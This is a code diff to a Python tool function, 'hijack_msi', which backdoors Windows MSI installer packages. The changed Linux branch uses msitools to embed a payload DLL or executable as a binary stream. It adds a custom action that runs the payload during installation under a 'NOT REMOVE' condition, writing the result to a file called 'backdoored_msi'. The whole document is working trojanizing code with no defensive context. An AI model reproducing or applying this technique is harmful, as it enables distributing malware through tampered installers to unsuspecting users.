@@ -206,80 +206,90 @@ def hijack_msi(source_msi: pathlib.Path,
             raise RuntimeError(f"Failed to hijack MSI using msilib: {str(e)}")
     
     else:
-        # Use msitools for Linux
+        # Use msitools for Linux (msibuild approach)
         try:
             with tempfile.TemporaryDirectory() as temp_dir:
                 temp_path = pathlib.Path(temp_dir)
                 
-                # Use msiinfo to add entries directly to the MSI database
-                binary_name = f"Payload_{uuid.uuid4().hex[:8]}"
+                binary_name = f"Binary.Payload_{uuid.uuid4().hex[:8]}"
                 is_dll = payload_path.suffix.lower() == ".dll"
                 action_type = 1250 if is_dll else 34
                 
-                # Step 1: Add payload to Binary table using msiinfo
-                # msiinfo requires streams to be added with -s option
+                # Step 1: Add the payload binary as a stream using msibuild
                 subprocess.check_call([
-                    "msiinfo", "streams", "-a", binary_name,
-                    str(payload_path), str(backdoored_msi)
-                ])
+                    "msibuild",
+                    str(backdoored_msi),
+                    "-a", binary_name, str(payload_path)
+                ], stderr=subprocess.STDOUT)
                 
-                # Step 2: Create SQL script for CustomAction and InstallExecuteSequence
-                sql_script = temp_path / "modify.sql"
-                sql_content = f"""INSERT INTO `CustomAction` (`Action`, `Type`, `Source`, `Target`) VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '')
-INSERT INTO `InstallExecuteSequence` (`Action`, `Condition`, `Sequence`) VALUES ('{custom_action_name}', 'NOT REMOVE', 6599)
-"""
-                sql_script.write_text(sql_content)
+                # Step 2: Export existing tables that we need to modify
+                tables_dir = temp_path / "tables"
+                tables_dir.mkdir()
                 
-                # Step 3: Apply SQL modifications to MSI tables
-                # Use msiinfo export/import to modify tables
-                result = subprocess.run([
-                    "msiinfo", "execute", str(backdoored_msi), str(sql_script)
-                ], capture_output=True, text=True)
-                
-                if result.returncode != 0:
-                    # Fallback: Try using msibuild approach
-                    # Export tables, modify them, and rebuild
-                    tables_dir = temp_path / "tables"
-                    tables_dir.mkdir()
-                    
-                    # Export existing tables
-                    for table in ["CustomAction", "InstallExecuteSequence"]:
-                        try:
-                            output = subprocess.check_output([
-                                "msiinfo", "export", str(backdoored_msi), table
-                            ], text=True)
-                            (tables_dir / f"{table}.idt").write_text(output)
-                        except subprocess.CalledProcessError:
-                            # Table might not exist, create it
-                            pass
-                    
-                    # Append CustomAction entry
+                # Export CustomAction table (create if doesn't exist)
+                try:
+                    ca_output = subprocess.check_output([
+                        "msiinfo", "export", str(backdoored_msi), "CustomAction"
+                    ], text=True, stderr=subprocess.STDOUT)
                     ca_file = tables_dir / "CustomAction.idt"
-                    ca_content = ca_file.read_text() if ca_file.exists() else ""
-                    if not ca_content.endswith("\n"):
-                        ca_content += "\n"
-                    ca_content += f"{custom_action_name}\t{action_type}\t{binary_name}\t\n"
-                    ca_file.write_text(ca_content)
-                    
-                    # Append InstallExecuteSequence entry
+                    ca_file.write_text(ca_output)
+                except subprocess.CalledProcessError:
+                    # Table doesn't exist, create it with proper header
+                    ca_file = tables_dir / "CustomAction.idt"
+                    ca_file.write_text(
+                        "Action\tType\tSource\tTarget\n"
+                        "s72\ti2\tS64\tS0\n"
+                        "CustomAction\tAction\n"
+                    )
+                
+                # Export InstallExecuteSequence table
+                try:
+                    ies_output = subprocess.check_output([
+                        "msiinfo", "export", str(backdoored_msi), "InstallExecuteSequence"
+                    ], text=True, stderr=subprocess.STDOUT)
                     ies_file = tables_dir / "InstallExecuteSequence.idt"
-                    ies_content = ies_file.read_text() if ies_file.exists() else ""
-                    if not ies_content.endswith("\n"):
-                        ies_content += "\n"
-                    ies_content += f"{custom_action_name}\tNOT REMOVE\t6590\n"
-                    ies_file.write_text(ies_content)
-                    
-                    # Import modified tables back
-                    for table_file in tables_dir.glob("*.idt"):
-                        subprocess.check_call([
-                            "msiinfo", "import", str(backdoored_msi), str(table_file)
-                        ])
+                    ies_file.write_text(ies_output)
+                except subprocess.CalledProcessError:
+                    # Table doesn't exist, create it with proper header
+                    ies_file = tables_dir / "InstallExecuteSequence.idt"
+                    ies_file.write_text(
+                        "Action\tCondition\tSequence\n"
+                        "s72\tS255\tI2\n"
+                        "InstallExecuteSequence\tAction\n"
+                    )
+                
+                # Step 3: Modify the tables - append our custom entries
+                # Add CustomAction entry
+                ca_file = tables_dir / "CustomAction.idt"
+                ca_content = ca_file.read_text()
+                # Strip off just the binary name part (remove "Binary." prefix for table entry)
+                binary_table_name = binary_name.replace("Binary.", "")
+                ca_content += f"{custom_action_name}\t{action_type}\t{binary_table_name}\t\n"
+                ca_file.write_text(ca_content)
+                
+                # Add InstallExecuteSequence entry
+                ies_file = tables_dir / "InstallExecuteSequence.idt"
+                ies_content = ies_file.read_text()
+                ies_content += f"{custom_action_name}\tNOT REMOVE\t6599\n"
+                ies_file.write_text(ies_content)
+                
+                # Step 4: Import the modified tables back into the MSI
+                subprocess.check_call([
+                    "msibuild",
+                    str(backdoored_msi),
+                    "-i", str(ca_file)
+                ], stderr=subprocess.STDOUT)
+                
+                subprocess.check_call([
+                    "msibuild",
+                    str(backdoored_msi),
+                    "-i", str(ies_file)
+                ], stderr=subprocess.STDOUT)
                 
                 return backdoored_msi
                 
         except subprocess.CalledProcessError as e:
-            stderr = e.stderr if hasattr(e, 'stderr') and e.stderr else ""
-            stdout = e.stdout if hasattr(e, 'stdout') and e.stdout else ""
-            raise RuntimeError(f"Failed to hijack MSI using msitools: {str(e)}\nStdout: {stdout}\nStderr: {stderr}")
-        except FileNotFoundError:
-            raise RuntimeError("msitools not found. Install with: apt-get install msitools")
+            output = e.output.decode() if hasattr(e, 'output') and e.output else str(e)
+            raise RuntimeError(f"Failed to hijack MSI using msitools: {output}")
+        except FileNotFoundError as e:
+            raise RuntimeError(f"msitools not found. Install with: apt-get install msitools\nMissing command: {str(e)}")
